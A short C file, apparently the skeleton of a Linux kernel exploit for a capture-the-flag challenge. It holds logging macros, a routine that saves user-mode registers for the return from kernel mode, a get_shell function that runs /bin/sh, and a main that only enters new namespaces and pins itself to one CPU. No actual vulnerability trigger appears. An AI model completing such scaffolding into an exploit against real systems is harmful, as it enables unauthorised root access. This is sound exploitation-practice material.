// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#define COLOR_RED "\033[31m"
#define COLOR_GREEN "\033[32m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN "\033[36m"
#define COLOR_RESET "\033[0m"
#define log(X) printf(COLOR_BLUE "[*] %s --> 0x%lx \033[0m\n", (#X), (X))
#define success(X) printf(COLOR_GREEN "[*] %s --> 0x%lx \033[0m\n", (#X), (X))
#define errExit(X)                                                             \
  printf(COLOR_RED "[*] %s \033[0m\n", (X));                                   \
  exit(0)

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  puts("[*]status has been saved.");
}
void get_shell(void) { system("/bin/sh"); }

int main() {
  cpu_set_t cpu_set;

  if (unshare(CLONE_NEWUSER) < 0)
    errExit("unshare(CLONE_NEWUSER)");
  if (unshare(CLONE_NEWNET) < 0)
    errExit("unshare(CLONE_NEWNET)");

  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

  return 0;
}
